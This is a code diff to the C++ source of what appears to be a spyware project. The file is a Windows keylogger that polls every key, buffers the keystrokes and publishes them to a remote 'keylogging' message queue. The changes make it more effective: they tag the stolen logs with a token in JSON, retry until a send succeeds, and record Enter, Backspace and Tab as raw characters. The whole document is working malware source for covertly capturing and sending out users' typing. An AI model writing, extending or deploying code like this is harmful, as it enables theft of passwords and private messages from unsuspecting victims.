@@ -2,11 +2,15 @@
 #include <stdlib.h>
 #include <locale>
 #include <codecvt>
+#include <fstream>
+
+#include <nlohmann/json.hpp>
 
 #if defined(_WIN64) || defined(_WIN32)
 #include <windows.h>
 #include <winuser.h>
 #endif
+
 
 #include "keylogger.hpp"
 #include "../core/debug.hpp"
@@ -19,7 +23,7 @@
 bool WinHandleKeyStroke (std::wstring &, int);
 void WinScannedKeyTranslate (std::wstring &, int);
 
-void startKeylogger(AmqpClient &amqpClient) {
+void startKeylogger(AmqpClient &amqpClient, std::string token) {
     unsigned long long lastSend = getTimestamp();
     std::wstring keyStrokeBuffer;
     std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
@@ -35,15 +39,25 @@ void startKeylogger(AmqpClient &amqpClient) {
 
         for (int KEY = 8; KEY <= 222; KEY++) {
             bool mustBreak = WinHandleKeyStroke(keyStrokeBuffer, KEY);
-            if (mustBreak) break;
+            // if (mustBreak) break;
         }
         
         if (keyStrokeBuffer.length() >= _SPYWARE_KEYLOG_BUFFER_MAX_ ||
-        (lastSend + _SPYWARE_MAX_SEND_INTERVAL_ <= now && keyStrokeBuffer.length() > 0)) {
+        (lastSend + (_SPYWARE_MAX_SEND_INTERVAL_) <= now && keyStrokeBuffer.length() > 0)) {
             std::string logs = converter.to_bytes(keyStrokeBuffer);
-            amqpClient.basicPublish("", "keylogging", logs);
-            keyStrokeBuffer.clear();
-            lastSend = now;
+            std::string dataStr;
+            bool published = false;
+            nlohmann::json data;
+
+            data["token"] = token;
+            data["payload"] = logs;
+            dataStr = data.dump();
+            published = amqpClient.basicPublish("", "keylogging", dataStr);
+
+            if (published) {
+                keyStrokeBuffer.clear();
+                lastSend = now;
+            }
         }
 
         Sleep(10);
@@ -66,13 +80,13 @@ bool WinHandleKeyStroke (std::wstring &input, int scannedKey) {
             // input.append(L"[SHIFT]");
             return true;
         case VK_RETURN:
-            input.append(L"[ENTER]");
+            input.append(L"\n");
             return true;
         case VK_BACK:
-            input.append(L"[BACKSPACE]");
+            input.append(L"\b");
             return true;
         case VK_TAB:
-            // input.append(L"[TAB]");
+            input.append(L" ");
             return true;
         case VK_CONTROL:
             // input.append(L"[CTRL]");
